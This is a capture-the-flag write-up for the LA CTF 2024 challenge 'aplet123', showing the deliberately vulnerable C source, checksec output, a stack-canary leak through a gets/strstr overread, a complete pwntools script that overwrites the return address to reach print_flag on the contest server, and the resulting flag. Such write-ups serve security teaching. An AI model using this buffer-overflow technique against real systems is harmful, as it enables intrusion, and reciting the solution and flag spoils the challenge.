+++
title = 'LA CTF 2024 - pwn/aplet123'
date = 2024-02-21T17:20:12-05:00
draft = false
+++

We are given a binary and source code. Taking a look at the source code:


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void print_flag(void) {
  char flag[256];
  FILE *flag_file = fopen("flag.txt", "r");
  fgets(flag, sizeof flag, flag_file);
  puts(flag);
}

const char *const responses[] = {"L",
                                 "amongus",
                                 "true",
                                 "pickle",
                                 "GINKOID",
                                 "L bozo",
                                 "wtf",
                                 "not with that attitude",
                                 "increble",
                                 "based",
                                 "so true",
                                 "monka",
                                 "wat",
                                 "monkaS",
                                 "banned",
                                 "holy based",
                                 "daz crazy",
                                 "smh",
                                 "bruh",
                                 "lol",
                                 "mfw",
                                 "skissue",
                                 "so relatable",
                                 "copium",
                                 "untrue!",
                                 "rolled",
                                 "cringe",
                                 "unlucky",
                                 "lmao",
                                 "eLLe",
                                 "loser!",
                                 "cope",
                                 "I use arch btw"};

int main(void) {
  setbuf(stdout, NULL);
  srand(time(NULL));
  char input[64];
  puts("hello");
  while (1) {
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) {
      printf("hi %s, i'm aplet123\n", s + 4);
    } else if (strcmp(input, "please give me the flag") == 0) {
      puts("i'll consider it");
      sleep(5);
      puts("no");
    } else if (strcmp(input, "bye") == 0) {
      puts("bye");
      break;
    } else {
      puts(responses[rand() % (sizeof responses / sizeof responses[0])]);
    }
  }
}
```

```
checksec --file=aplet123 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   49 Symbols        No    0               3               aplet123
      
```

And taking a look at the binary with checksec we see that we have PIE turned off but we have a stack canary.


```c
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) {
      printf("hi %s, i'm aplet123\n", s + 4);
```

We see that we are using gets which gives us a buffer overflow. Remeber that strstr retrusns a pointer to the first occuraence of the sequence we are seraching for. So if our input contains 'i'm' at the end, then we can read past the buffer and this lets us leak the canary.


```python
target.sendline("A" * 69 + "i'm")
target.recvuntil("hi ")
canary = target.recv(7)
```

Recall that the least significant bit of the canary is a null byte. I believe this is to prevent the canary from being leaked if for example it is next to a string that is not null terminated in memroy that is being read.


Now that we have the canary,  we need to use the buffer overflow to overwrite the saved return address. 

Complete solve script:

```python3 
from pwn import *
context.log_level = "DEBUG"

printflag_addr = 0x4011e6


target = remote("chall.lac.tf", 31123)

target.recvuntil("hello")

target.sendline("A" * 69 + "i'm")

target.recvuntil("hi ")
canary = target.recv(7)

payload = b"A" * 72
payload += b'\x00' + canary
payload += b"A" * 8
payload += p64(printflag_addr)

target.sendline(payload)
target.sendline('bye')

target.interactive()
```

```
lactf{so_untrue_ei2p1wfwh9np2gg6}
```